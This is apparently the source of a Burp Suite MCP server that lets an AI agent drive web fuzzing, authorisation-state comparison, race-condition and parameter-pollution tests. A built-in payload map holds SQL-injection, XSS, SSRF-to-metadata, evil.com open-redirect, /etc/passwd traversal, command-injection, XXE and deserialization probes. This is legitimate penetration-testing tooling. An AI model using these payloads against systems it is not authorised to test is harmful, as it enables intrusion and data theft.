"""Advanced testing tools - smart fuzzing engine and auth state comparison."""

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client


# Smart payload mapping based on parameter name heuristics
_SMART_PAYLOAD_MAP = {
    "sqli": {
        "names": ["id", "uid", "pid", "user_id", "account_id", "order_id", "item_id",
                  "product_id", "num", "number", "count", "page", "limit", "offset"],
        "payloads": ["'", "1 OR 1=1--", "1' AND '1'='1", "1 UNION SELECT NULL--", "1; WAITFOR DELAY '0:0:3'--"],
    },
    "xss": {
        "names": ["search", "q", "query", "keyword", "name", "comment", "message",
                  "title", "description", "text", "content", "value", "input", "email"],
        "payloads": ["<script>alert(1)</script>", "\" onmouseover=alert(1)", "<img src=x onerror=alert(1)>", "javascript:alert(1)", "'-alert(1)-'"],
    },
    "ssrf": {
        "names": ["url", "uri", "href", "link", "src", "source", "target", "dest",
                  "destination", "domain", "host", "site", "feed", "callback", "webhook"],
        "payloads": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22", "http://[::1]/", "http://0x7f000001/"],
    },
    "redirect": {
        "names": ["redirect", "redirect_uri", "redirect_url", "return", "return_url",
                  "next", "goto", "forward", "continue", "redir", "returnTo"],
        "payloads": ["https://evil.com", "//evil.com", "\\/\\/evil.com", "https://evil.com@target.com"],
    },
    "lfi": {
        "names": ["file", "filename", "path", "filepath", "dir", "directory", "folder",
                  "page", "include", "template", "load", "read", "doc", "document"],
        "payloads": ["../../../etc/passwd", "....//....//....//etc/passwd", "..%252f..%252f..%252fetc/passwd", "/etc/passwd"],
    },
    "cmdi": {
        "names": ["cmd", "command", "exec", "execute", "run", "ping", "ip", "address", "hostname"],
        "payloads": ["; id", "| id", "$(id)", "`id`", "& whoami"],
    },
    "ssti": {
        "names": ["template", "render", "view", "layout", "theme", "format", "output",
                  "preview", "display", "expression", "eval"],
        "payloads": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{7*7}"],
    },
    "nosql": {
        "names": ["username", "password", "email", "login", "user", "pass", "filter",
                  "where", "sort", "order", "populate", "select"],
        "payloads": ['{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}', "' || 'a'=='a", "admin' || ''=='"],
    },
    "xxe": {
        "names": ["xml", "data", "soap", "payload", "content", "body", "feed", "rss", "wsdl"],
        "payloads": ['<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///etc/passwd">]><f>&x;</f>',
                     '<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///etc/hostname">]><f>&x;</f>'],
    },
    "crlf": {
        "names": ["url", "redirect", "return", "next", "goto", "dest", "host", "header",
                  "ref", "referer", "origin", "location"],
        "payloads": ["%0d%0aX-Injected: true", "%0d%0aSet-Cookie: evil=true",
                     "%0d%0a%0d%0a<script>alert(1)</script>", "\\r\\nX-Injected: true"],
    },
    "deserialization": {
        "names": ["data", "object", "payload", "token", "session", "viewstate", "state",
                  "serialized"],
        "payloads": ['O:8:"stdClass":0:{}', "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==",
                     '{"rce":"_$$ND_FUNC$$_function(){return 1}()"}', 'a:1:{s:4:"test";s:4:"test";}'],
    },
    "mass_assignment": {
        "names": ["role", "admin", "is_admin", "privilege", "permission", "group", "level",
                  "verified", "active", "approved", "is_staff", "credits", "balance", "plan"],
        "payloads": ['{"role":"admin"}', '{"is_admin":true}', '{"price":0}',
                     '{"discount":100}', '{"verified":true}'],
    },
}


def _matches_param_name(param_lower: str, target_name: str) -> bool:
    """Check if parameter name matches target, with word-boundary awareness for short names."""
    if param_lower == target_name:
        return True
    if len(target_name) <= 3:
        # Short names (id, ip, q): require word boundary (underscore, start, or end)
        return (
            param_lower.startswith(target_name + "_") or
            param_lower.endswith("_" + target_name) or
            f"_{target_name}_" in param_lower
        )
    # Longer names (search, command, file): substring match is safe
    return target_name in param_lower


def _get_smart_payloads(param_name: str) -> list[str]:
    """Auto-select payloads based on parameter name heuristics."""
    param_lower = param_name.lower()
    payloads = []
    for config in _SMART_PAYLOAD_MAP.values():
        if param_lower in config["names"] or any(_matches_param_name(param_lower, n) for n in config["names"]):
            payloads.extend(config["payloads"])
    if not payloads:
        payloads = ["'", "<script>alert(1)</script>", "{{7*7}}", "../../../etc/passwd", "; id"]
    return payloads


def register(mcp: FastMCP):

    @mcp.tool()
    async def fuzz_parameter(
        index: int,
        parameters: list[dict] | None = None,
        parameter: str = "",
        payloads: list[str] | None = None,
        injection_point: str = "query",
        attack_type: str = "sniper",
        grep_match: list[str] | None = None,
        grep_extract: str = "",
        delay_ms: int = 0,
        smart_payloads: bool = False,
    ) -> str:
        """Smart fuzz engine - send Claude-generated payloads and analyze responses for anomalies.
        You are the brain: analyze the target's tech stack, parameters, and context to craft
        targeted payloads. This tool is the execution engine.

        Attack types:
        - sniper: One parameter at a time, each payload (default)
        - battering_ram: Same payload in all parameters simultaneously
        - pitchfork: Parallel payload lists (payload[i] in param[i])
        - cluster_bomb: All combinations across all parameters

        Results include anomaly detection: status code changes, response length variance,
        timing anomalies, and grep pattern matches.

        Args:
            index: Proxy history index of the base request
            parameters: List of parameter configs: [{"name": "id", "position": "query", "payloads": ["1", "' OR 1=1--"]}]
            parameter: Simple mode - single parameter name (use with payloads + injection_point)
            payloads: Simple mode - payload list for single parameter
            injection_point: Simple mode - where to inject: query, body, header, path, cookie
            attack_type: sniper, battering_ram, pitchfork, or cluster_bomb
            grep_match: List of strings to search for in responses (e.g. ["error", "SQL", "syntax"])
            grep_extract: Regex pattern to extract from responses
            delay_ms: Delay between requests in milliseconds
            smart_payloads: Auto-generate payloads based on parameter names (e.g. 'id' gets SQLi, 'search' gets XSS)
        """
        # Smart payload auto-generation based on parameter name heuristics
        if smart_payloads:
            if parameters:
                for p in parameters:
                    if not p.get("payloads"):
                        p["payloads"] = _get_smart_payloads(p.get("name", ""))
            elif parameter:
                payloads = _get_smart_payloads(parameter)

        # Build the request payload
        payload: dict = {"index": index, "attack_type": attack_type}

        if parameters:
            payload["parameters"] = parameters
        elif parameter and payloads:
            payload["parameters"] = [{"name": parameter, "position": injection_point, "payloads": payloads}]
        else:
            return "Error: Provide 'parameters' list or 'parameter' + 'payloads'"

        if grep_match:
            payload["grep_match"] = grep_match
        if grep_extract:
            payload["grep_extract"] = grep_extract
        if delay_ms > 0:
            payload["delay_ms"] = delay_ms

        data = await client.post("/api/fuzz", json=payload)
        if "error" in data:
            return f"Error: {data['error']}"

        return _format_fuzz_results(data)

    @mcp.tool()
    async def compare_auth_states(
        index: int,
        original_cookies: dict | None = None,
        alt_cookies: dict | None = None,
        original_token: str = "",
        alt_token: str = "",
        remove_auth: bool = False,
    ) -> str:
        """Compare responses between different authentication states to find IDOR/auth bypass.
        Resends a request with different credentials and diffs the responses.

        Use cases:
        - IDOR: Same endpoint with different user's session cookie
        - Auth bypass: Request with vs without authentication
        - Privilege escalation: Admin endpoint with regular user token

        Args:
            index: Proxy history index of the request to test
            original_cookies: Cookies dict for first request (uses original if empty)
            alt_cookies: Cookies dict for second request (different user)
            original_token: Bearer token for first request (uses original if empty)
            alt_token: Bearer token for second request (different user)
            remove_auth: If True, second request strips all auth headers/cookies
        """
        # First request: original or with specified auth
        modify1: dict = {"index": index}
        if original_cookies:
            cookie_str = "; ".join(
                f"{k}={v.replace(';', '%3B')}" for k, v in original_cookies.items()
            )
            modify1["modify_headers"] = {"Cookie": cookie_str}
        if original_token:
            headers = modify1.get("modify_headers", {})
            headers["Authorization"] = f"Bearer {original_token}"
            modify1["modify_headers"] = headers

        # Second request: alternate auth or no auth
        modify2: dict = {"index": index}
        if alt_cookies:
            cookie_str = "; ".join(
                f"{k}={v.replace(';', '%3B')}" for k, v in alt_cookies.items()
            )
            modify2["modify_headers"] = {"Cookie": cookie_str}
        if alt_token:
            headers = modify2.get("modify_headers", {})
            headers["Authorization"] = f"Bearer {alt_token}"
            modify2["modify_headers"] = headers
        if remove_auth:
            modify2["modify_headers"] = {"Cookie": "", "Authorization": ""}

        # Send both requests
        data1 = await client.post("/api/http/resend", json=modify1)
        data2 = await client.post("/api/http/resend", json=modify2)

        if "error" in data1:
            return f"Error (request 1): {data1['error']}"
        if "error" in data2:
            return f"Error (request 2): {data2['error']}"

        status1 = data1.get("status_code", 0)
        status2 = data2.get("status_code", 0)
        length1 = data1.get("response_length", 0)
        length2 = data2.get("response_length", 0)
        body1 = data1.get("response_body", "")
        body2 = data2.get("response_body", "")

        lines = ["Auth State Comparison:\n"]
        lines.append(f"  Request 1 (original auth): Status {status1}, Length {length1}")
        lines.append(f"  Request 2 (alt auth):      Status {status2}, Length {length2}")
        lines.append("")

        if status1 == status2 and abs(length1 - length2) < 50:
            lines.append("[!!] POTENTIAL VULNERABILITY: Both requests returned similar responses!")
            lines.append("     This could indicate IDOR or broken access control.")
            if body1 == body2:
                lines.append("     Responses are IDENTICAL - strong indicator of missing auth checks.")
            else:
                lines.append(f"     Responses differ slightly ({abs(length1 - length2)} bytes difference).")
        elif status1 == status2:
            lines.append(f"[!] Same status code ({status1}) but different content lengths.")
            lines.append("    May need manual review.")
        else:
            lines.append(f"[OK] Different responses: {status1} vs {status2}")
            if status2 in (401, 403):
                lines.append("     Access control appears to be working (got 401/403).")
            elif status2 in (200, 302):
                lines.append(f"     [!] Alt auth got {status2} - review if data should be accessible.")

        lines.append(f"\n--- Response 1 (first 500 chars) ---")
        lines.append(body1[:500] if body1 else "(empty)")
        lines.append(f"\n--- Response 2 (first 500 chars) ---")
        lines.append(body2[:500] if body2 else "(empty)")

        return "\n".join(lines)

    @mcp.tool()
    async def send_to_comparer(index1: int, index2: int) -> str:
        """Send two proxy history items to Burp's Comparer tab for visual comparison.

        Args:
            index1: First proxy history index
            index2: Second proxy history index
        """
        data = await client.post("/api/search/send-to-comparer", json={
            "index1": index1,
            "index2": index2,
        })
        if "error" in data:
            return f"Error: {data['error']}"
        return data.get("message", "Sent to Comparer")

    @mcp.tool()
    async def compare_responses(
        index1: int,
        index2: int,
        mode: str = "full",
    ) -> str:
        """Enhanced response comparison - detailed diff between two proxy history items.
        More detailed than get_response_diff: shows header diffs, body similarity,
        unique words in each response.

        Args:
            index1: First proxy history index
            index2: Second proxy history index
            mode: Comparison mode - 'full', 'headers', or 'body'
        """
        data = await client.post("/api/search/compare", json={
            "index1": index1,
            "index2": index2,
            "mode": mode,
        })
        if "error" in data:
            return f"Error: {data['error']}"

        lines = [f"Enhanced Comparison: #{index1} vs #{index2} (mode: {mode})\n"]

        status = data.get("status_diff", {})
        if status:
            lines.append(f"Status: {status.get('item1', '?')} vs {status.get('item2', '?')}")

        length = data.get("length_diff", {})
        if length:
            lines.append(f"Length: {length.get('item1', '?')} vs {length.get('item2', '?')}")

        # Header diffs
        header_diffs = data.get("header_diffs", [])
        if header_diffs:
            lines.append(f"\n--- Header Differences ({len(header_diffs)}) ---")
            for h in header_diffs:
                lines.append(f"  {h.get('name')}: {h.get('item1', '(absent)')} vs {h.get('item2', '(absent)')}")

        # Body diff
        body = data.get("body_diff", {})
        if body:
            lines.append(f"\n--- Body Diff ---")
            lines.append(f"  Identical: {body.get('identical', False)}")
            if "similarity_pct" in body:
                lines.append(f"  Similarity: {body['similarity_pct']}%")
            lines.append(f"  Added: {body.get('added_lines', 0)} | Removed: {body.get('removed_lines', 0)}")
            for line in body.get("diff_lines", [])[:50]:
                lines.append(f"  {line}")

        # Unique words
        u1 = data.get("unique_to_item1", [])
        u2 = data.get("unique_to_item2", [])
        if u1:
            lines.append(f"\nUnique to #{index1}: {', '.join(u1[:20])}")
        if u2:
            lines.append(f"Unique to #{index2}: {', '.join(u2[:20])}")

        return "\n".join(lines)

    @mcp.tool()
    async def test_auth_matrix(
        endpoints: list[dict],
        auth_states: dict,
        base_url: str = "",
    ) -> str:
        """Test endpoints across multiple auth states to detect IDOR and broken access control.
        Fires all combinations and returns a comparison matrix flagging where lower-privilege
        users get the same response as higher-privilege users.

        Args:
            endpoints: List of endpoints - [{"method": "GET", "path": "/api/users/42"}]
            auth_states: Auth configurations - {"admin": {"session": "s1"}, "anon": {"remove_auth": True}}
            base_url: Override base URL (uses first session's base_url if empty)
        """
        payload: dict = {"endpoints": endpoints, "auth_states": auth_states}
        if base_url:
            payload["base_url"] = base_url

        data = await client.post("/api/attack/auth-matrix", json=payload)
        if "error" in data:
            return f"Error: {data['error']}"

        lines = [f"Auth Matrix: {data['endpoints_tested']} endpoints x {data['auth_states_tested']} states = {data['total_requests']} requests\n"]

        # Build matrix table from results array
        for row in data.get("matrix", []):
            ep = f"{row['method']} {row['path']}"
            lines.append(f"  {ep}")
            results = row.get("results", [])
            if isinstance(results, list):
                for cell in results:
                    state = cell.get("auth_state", "?")
                    status = cell.get("status", "?")
                    length = cell.get("response_length", cell.get("length", 0))
                    idor = " *** IDOR ***" if cell.get("potential_idor") else ""
                    baseline = " (baseline)" if cell.get("baseline") else ""
                    sim = cell.get("similarity_to_baseline")
                    sim_str = f" [{int(sim*100)}% similar]" if sim is not None and not cell.get("baseline") else ""
                    lines.append(f"    {state}: {status} ({_fmt_size(length)}){sim_str}{baseline}{idor}")
            lines.append("")

        issues = data.get("potential_issues", 0)
        if issues:
            lines.append(f"Potential IDOR issues: {issues}")

        return "\n".join(lines)

    @mcp.tool()
    async def test_race_condition(
        session: str,
        request: dict,
        concurrent: int = 10,
        expect_once: bool = True,
    ) -> str:
        """Fire N identical requests simultaneously to detect race conditions.
        Uses server-side thread synchronization for minimal jitter.

        Args:
            session: Session name for auth state
            request: Request spec - {"method": "POST", "path": "/transfer", "json_body": {"amount": 100}}
            concurrent: Number of simultaneous requests (default 10, max 50)
            expect_once: Flag if action succeeded more than once (default True)
        """
        payload = {
            "session": session,
            "request": request,
            "concurrent": concurrent,
            "expect_once": expect_once,
        }
        data = await client.post("/api/attack/race", json=payload)
        if "error" in data:
            return f"Error: {data['error']}"

        lines = [f"{data['concurrent']} requests sent in {data['total_time_ms']}ms window"]

        dist = data.get("status_distribution", {})
        dist_str = ", ".join(f"{status}x{count}" for status, count in dist.items())
        lines.append(f"Status distribution: {dist_str}")
        lines.append(f"Success count: {data['success_count']}")

        if data.get("vulnerable"):
            lines.append(f"\n*** {data['finding']} ***")

        lines.append("\nResponse breakdown:")
        for r in data.get("results", []):
            preview = r.get("body_preview", "")
            if len(preview) > 100:
                preview = preview[:100] + "..."
            length = r.get('response_length', r.get('length', 0))
            lines.append(f"  #{r['index']}: {r['status']} ({_fmt_size(length)}) {r['time_ms']}ms — {preview}")

        return "\n".join(lines)

    @mcp.tool()
    async def test_parameter_pollution(
        session: str,
        base_path: str,
        parameter: str,
        original_value: str,
        polluted_values: list[str],
        locations: list[str] | None = None,
    ) -> str:
        """Test HTTP Parameter Pollution across query string, body, and mixed positions.
        Detects when backend parses duplicated/polluted parameters differently.

        Args:
            session: Session name for auth state
            base_path: Target endpoint path (e.g. '/api/transfer')
            parameter: Parameter name to pollute (e.g. 'amount')
            original_value: Original parameter value (e.g. '100')
            polluted_values: Pollution variants - ['100&amount=99999', '100,99999']
            locations: Where to inject - ['query', 'body', 'both'] (default all three)
        """
        payload: dict = {
            "session": session,
            "base_path": base_path,
            "parameter": parameter,
            "original_value": original_value,
            "polluted_values": polluted_values,
            "locations": locations or ["query", "body", "both"],
        }
        data = await client.post("/api/attack/hpp", json=payload)
        if "error" in data:
            return f"Error: {data['error']}"

        lines = [f"HPP Test: {data['variants_tested']} variants"]
        lines.append(f"Baseline: {data['baseline_status']} ({_fmt_size(data['baseline_length'])})\n")

        baseline_len = data['baseline_length']
        for r in data.get("results", []):
            length = r.get('response_length', r.get('length', 0))
            length_diff = abs(length - baseline_len)
            status_diff = r['status'] != data['baseline_status']
            anomaly = " *** ANOMALY ***" if status_diff or length_diff > baseline_len * 0.2 else ""
            payload = r.get('polluted_value', r.get('payload', '?'))
            lines.append(f"  [{r['location']}] {payload}")
            lines.append(f"    Status: {r['status']} | Length: {_fmt_size(length)} | Length diff: {length_diff}{anomaly}")

        anomalies = data.get("anomalies_found", 0)
        if anomalies:
            lines.append(f"\n{anomalies} anomalies found — backend may parse polluted parameters differently")

        return "\n".join(lines)


def _format_fuzz_results(data: dict) -> str:
    """Format fuzz results into a compact, analysis-friendly table."""
    results = data.get("results", [])
    total = data.get("total_requests", 0)
    baseline_status = data.get("baseline_status", "?")
    baseline_length = data.get("baseline_length", "?")

    lines = [f"Fuzz Results ({total} requests, baseline: {baseline_status}/{baseline_length} bytes):\n"]

    # Table header
    header = f"{'#':<4} {'PARAM':<15} {'PAYLOAD':<35} {'STATUS':<8} {'LENGTH':<10} {'TIME':<8}"
    grep_keys = set()
    for r in results:
        grep_keys.update(r.get("grep_matches", {}).keys())
    if grep_keys:
        header += " " + " ".join(f"{k[:8]:<8}" for k in sorted(grep_keys))
    header += " FLAGS"
    lines.append(header)
    lines.append("-" * len(header))

    for r in results:
        payload_display = r.get("payload", "")[:33]
        if len(r.get("payload", "")) > 33:
            payload_display += ".."

        anomalies = r.get("anomalies", [])
        flags = " ".join(f"[!{a}]" for a in anomalies) if anomalies else ""

        line = (
            f"{r.get('payload_index', '?'):<4} "
            f"{r.get('parameter', '?'):<15} "
            f"{payload_display:<35} "
            f"{r.get('status_code', '?'):<8} "
            f"{r.get('response_length', '?'):<10} "
            f"{r.get('response_time_ms', '?'):<8}"
        )

        # Grep matches
        grep = r.get("grep_matches", {})
        if grep_keys:
            line += " " + " ".join(f"{grep.get(k, 0):<8}" for k in sorted(grep_keys))

        line += f" {flags}"
        lines.append(line)

        # Show response snippet for anomalous results
        snippet = r.get("response_snippet", "")
        if snippet and anomalies:
            lines.append(f"     > {snippet[:120]}")

    # Anomaly summary
    summary = data.get("anomaly_summary", {})
    if summary:
        lines.append(f"\n--- Anomaly Summary ---")
        if summary.get("status_anomalies"):
            lines.append(f"  [!STATUS] {summary['status_anomalies']} responses with different status code")
        if summary.get("length_anomalies"):
            lines.append(f"  [!LENGTH] {summary['length_anomalies']} responses with unusual length")
        if summary.get("timing_anomalies"):
            lines.append(f"  [!TIMING] {summary['timing_anomalies']} responses with unusual timing")
        if summary.get("grep_hits"):
            lines.append(f"  [!GREP]   {summary['grep_hits']} grep pattern matches")

    return "\n".join(lines)


def _fmt_size(n):
    """Format byte size compactly."""
    if n < 1024:
        return f"{n}B"
    return f"{n/1024:.1f}K"
